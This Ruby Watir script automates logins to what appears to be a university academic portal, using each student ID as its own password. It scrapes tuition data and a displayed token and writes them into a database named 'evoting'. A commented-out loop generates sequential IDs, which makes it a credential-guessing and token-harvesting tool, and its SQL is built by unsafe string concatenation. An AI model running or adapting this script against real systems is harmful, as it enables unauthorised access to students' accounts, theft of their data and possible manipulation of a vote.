require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
@@baseUrl = "http://192.168.0.55/"
@@browser = Watir::Browser.new :chrome


@@NIM = "O1A1"
@@tahun = [ "20" ]
@@start = 1
@@_end = 99

$i = 0

begin
    @@no = $i.to_s.rjust(3, "0")
    # puts("Inside the loop i = "+"#{@@nim}" +"#{@@tahun[0]}"+"#{@@no}" )

    # nim = "#{@@NIM}" +"#{@@tahun[0]}"+"#{@@no}"
    nim = "e1e116017"
    pass = nim
    puts( nim )

    @@browser.goto @@baseUrl + "/index.php?exec=login"
    @@browser.text_field(:name => "NIP").set nim
    @@browser.text_field(:name => "password").set pass
    @@browser.input(:type => "submit" ).click 

    $i +=1;

    sleep(1)    
    # if  @@browser.url != "http://192.168.0.55//ademik.php"
    if  @@browser.tables( :class => "box" ).length > 1
        begin
            text = @@browser.tables( :class => "box" )[1].tbody.trs[1].tds[1].text
            text = text.split(/\n/)
            token = @@browser.h2( :style => "color:red;font-size:25px" ).text
            puts( token )
            puts( text.inspect )
            puts( text[5] )
            ukt = text[5]
            tokenfix = token[7, token.length-1]
            puts(tokenfix)
            query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`, `token` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ", " + "'#{tokenfix}'" + ")"
            puts( query )
            


            client.query(query)
        rescue
            ap "failed to save data"
        end
    end
    sleep(300)

end until $i > @@_end


sleep(500)
